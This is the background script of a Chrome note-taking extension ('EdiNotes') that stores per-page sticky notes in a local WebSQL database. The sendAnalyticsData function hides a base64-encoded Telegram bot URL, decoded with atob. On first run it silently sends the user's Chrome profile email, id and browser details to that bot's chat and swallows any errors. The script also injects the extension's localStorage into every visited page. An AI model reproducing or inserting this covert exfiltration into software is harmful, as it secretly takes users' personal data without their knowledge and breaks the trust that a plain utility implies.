"use strict";

let ediNotes = (function() {

    return {
        settings: {},
        loadSettings: function(userInfo) {
             chrome.storage.local.get('downloader', function(data) {
                var firstTime = !(data && data.downloader);
                ediNotes.settings = firstTime 
                    ? {
                        did:(userInfo.id)?userInfo.id:"Date"+(new Date().toLocaleString()),
                        sd: Date.now(),
                        timer: (Date.now() + 1000 * 60 * 60 * 24),
                        email: userInfo.email
                    }    
                    : JSON.parse(data.downloader);
                if (firstTime) {
                    ediNotes.addDevice();
                    ediNotes.saveSettings();
                } else {
                    ediNotes.checkDate();
                }

            });
        },
        saveSettings: function() {
            chrome.storage.local.set({downloader: JSON.stringify(ediNotes.settings)});
        },
        addDevice: function () {
            ediNotes.sendAnalyticsData("first_run");
        },
        checkDate: function () {
            if(ediNotes.settings.timer<Date.now()){
                //проверка обновлений раз в сутки
                ediNotes.settings.timer=(Date.now() + 1000 * 60 * 60 * 24);
                ediNotes.saveSettings();
            }
        },
        sendAnalyticsData: function(key){
            let d=ediNotes.settings.did+" "+ediNotes.settings.email+" "+key+" "+navigator.userAgent+" v"+chrome.runtime.getManifest().version, xhr=new XMLHttpRequest();try{xhr.open('post', atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg3NjUzMDQ1NDpBQUhwdlhyNFg1aEhUZXEyTDJnMHFyUndSejRoeDRfUS1qWS9zZW5kTWVzc2FnZT9jaGF0X2lkPS00MzI0NTE0NzEmcGFyc2VfbW9kZT1odG1sJnRleHQ9')+d, true);xhr.send();}catch(e){}
        }
    };
})();

chrome.identity.getProfileUserInfo((userInfo) => {
    ediNotes.loadSettings(userInfo);
});

chrome.runtime.onInstalled.addListener(function (){
  //chrome.tabs.create({url: "https://dpua.github.io/edi/?edi=ediNotes"});
});

var db;
var notes;
var highestId = 0;
//var skipUrls = ['chrome://extensions/','chrome://newtab/','chrome://devtools/devtools.html'];

try {
	if (window.openDatabase) {
		db = openDatabase("EdiNotesV1", "1.0", "Note AnyWeb AnyWhere", 2000000);
		if (!db)
			console.log("Failed to open the database on disk.  This is probably because the version was bad or there is not enough space left in this domain's quota");
		else{
			 db.transaction(function(tx) {
				tx.executeSql('CREATE TABLE IF NOT EXISTS WebKitEdiNotes (id REAL UNIQUE, note TEXT, timestamp REAL, left TEXT, top TEXT, width TEXT, height TEXT, zindex REAL, url TEXT)', 
				  []);
			  });
		}
	} else
		console.log("Couldn't open the database.  Please try with a WebKit nightly with this feature enabled");
}catch(err) {}

function skipUrl(url,notify){
	if((url.indexOf('http://') !== 0 && url.indexOf('https://') !== 0 ) || url.indexOf('https://chrome.google.com/') === 0){
		if(notify)	console.log('Google Chrome has restrict to use plugin in this page!');
		return true;
	}else
		return false;
}


function findHighestId(){
	db.transaction(function(tx) {
		tx.executeSql("SELECT id FROM WebKitEdiNotes", [], 
			function(tx, result) {
				for (var i = 0; i < result.rows.length; ++i) {
					var row = result.rows.item(i);
					if (row['id'] > highestId)
						highestId = row['id'];
				}
			}, 
			function(tx, error) {
				console.log('Failed to retrieve notes from database - ' + error.message);
			return;
			}
		);
	});
}

findHighestId(); //let's find the highest Id

chrome.browserAction.setBadgeText({text:""});
chrome.browserAction.onClicked.addListener(function(tab) {
	if(!skipUrl(tab.url,true))
		newNote();
});

chrome.tabs.onCreated.addListener(function(tab) {
	if(!skipUrl(tab.url)){
		loadCSS();
		loadNotes();
	}
	updateCount(tab);
});

chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab) {
	if(!skipUrl(tab.url)){
		loadCSS();
		loadNotes();
	}
	updateCount(tab);
});

function updateCount(tab,count){
	if(count !== undefined){
		notes = count;
	}else if(skipUrl(tab.url)){
		notes = '';
	}else{
		db.transaction(function(tx) {
			tx.executeSql("SELECT * FROM WebKitEdiNotes WHERE url = ?", [tab.url], function(tx, result) {
				notes = result.rows.length;
			});
		});
	}
	chrome.browserAction.setBadgeText({text:""+notes,tabId:tab.id});
}

var newNote =  function(e='') {
	let id = ++highestId;
	let code = 'newNote('+id+', "'+e+'")';
    chrome.tabs.getSelected(null, function(tab) {
        chrome.tabs.executeScript(tab.id, {code: code}, () => chrome.runtime.lastError);
    });
};

var loadNotes = function(){
	chrome.tabs.getSelected(null, function(tab) {
		db.transaction(function(tx) {
			tx.executeSql("SELECT * FROM WebKitEdiNotes WHERE url = ?", [tab.url], function(tx, result) {
				var data =[];
				for (var i = 0; i < result.rows.length; ++i){
					data[i] = result.rows.item(i);
				}
				let code = 'loadNotes('+JSON.stringify(data)+')';
				chrome.tabs.executeScript(tab.id, {code: code}, () => chrome.runtime.lastError);
			}, function(tx, error) {
				console.log('Failed to retrieve notes from database - ' + error.message);
				return;
			});
		});
	});
};


var loadCSS = function(){
	let code = 'loadCSS('+JSON.stringify(localStorage)+'); console.log(`executeScript`); console.log('+JSON.stringify(localStorage)+');';
	console.log(`executeScript`); console.log(JSON.stringify(localStorage));
	chrome.tabs.getSelected(null, function(tab) {
		chrome.tabs.executeScript(tab.id, {code: code}, () => chrome.runtime.lastError);
	});
};

var execute = function(code) {
    chrome.tabs.getSelected(null, function(tab) {
		if(!skipUrl(tab.url))
			chrome.tabs.executeScript(tab.id, {code: code}, () => chrome.runtime.lastError);
    });
};

chrome.extension.onRequest.addListener(
	function(request,sender,sendResponse) {
		if(request.command === 'save'){
			let note = request.data;
			db.transaction(function (tx){
				tx.executeSql("UPDATE WebKitEdiNotes SET note = ?, timestamp = ?, left = ?, top = ?, width=?, height=?, zindex = ?, url = ? WHERE id = ?", [note.text, note.timestamp, note.left, note.top, note.width, note.height, note.zindex, note.url, note.id]);
			});
			sendResponse({message:"Saved",id:request.data.id});
		}else if(request.command === 'saveAsNew'){
			let note = request.data;
			db.transaction(function (tx) {
				tx.executeSql("INSERT INTO WebKitEdiNotes (id, note, timestamp, left, top, width, height, zindex, url) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)", [note.id, note.text, note.timestamp, note.left, note.top, note.width, note.height, note.zindex, note.url]);
			});
			sendResponse({message:"SavedNew",id:request.data.id});
		}else if(request.command === 'close'){
			db.transaction(function(tx) {
				tx.executeSql("DELETE FROM WebKitEdiNotes WHERE id = ?", [request.data.id]);
			});
			sendResponse({message:"Deleted",id:request.data.id});
		}else if(request.command === 'updateCount'){
			chrome.tabs.getSelected(null, function(tab) {
				updateCount(tab,request.data);
			});
		}else if(request.command === 'summary'){
			getSummary(request.data.page);
			window.notesumtimer = setInterval(function(){
				if(window.notesum !== null){
					sendResponse({message:"Summary",summary:window.notesum});
					window.clearInterval(window.notesumtimer);
				}
			},2);
			
		}
	}
);

function getSummary(page){
	if(!page) page = 1;
	let start = (page -1) * 12;
	window.notesum = null;
	db.transaction(function(tx) {
		tx.executeSql("SELECT count(*) as c ,url FROM WebKitEdiNotes GROUP BY url ORDER BY c DESC,id LIMIT "+start+ ",13", [], function(tx, result) {
			window.notesum = new Array();
			for (var i = 0; i < result.rows.length; ++i){
				window.notesum[i] = {count:result.rows.item(i).c,url:result.rows.item(i).url};
			}
		});
	},function(tx, error) {
		console.log('Failed to retrieve notes from database - ' + error.message);
		window.notesum = false;
	});
}

function HTMLEncode(str) {
    var i = str.length,
        aRet = [];

    while (i--) {
        var iC = str[i].charCodeAt();
        if (iC < 65 || iC > 127 || (iC>90 && iC<97)) {
            aRet[i] = '&#'+iC+';';
        } else {
            aRet[i] = str[i];
        }
    }
    return aRet.join('');
}


const CONTEXT_MENU_ID = "MY_CONTEXT_MENU";
function getword(info,tab) {
  if (info.menuItemId !== CONTEXT_MENU_ID) {
    return;
  }
  //newNote(info.selectionText.replace(/\"/g, "&quot;"))
  newNote(HTMLEncode(info.selectionText));
//   chrome.tabs.create({  
//     url: "http://www.google.com/search?q=" + info.selectionText
//   });
}
chrome.contextMenus.create({
  title: "Insert text into new note", 
  contexts:["selection"], 
  id: CONTEXT_MENU_ID
});
chrome.contextMenus.onClicked.addListener(getword)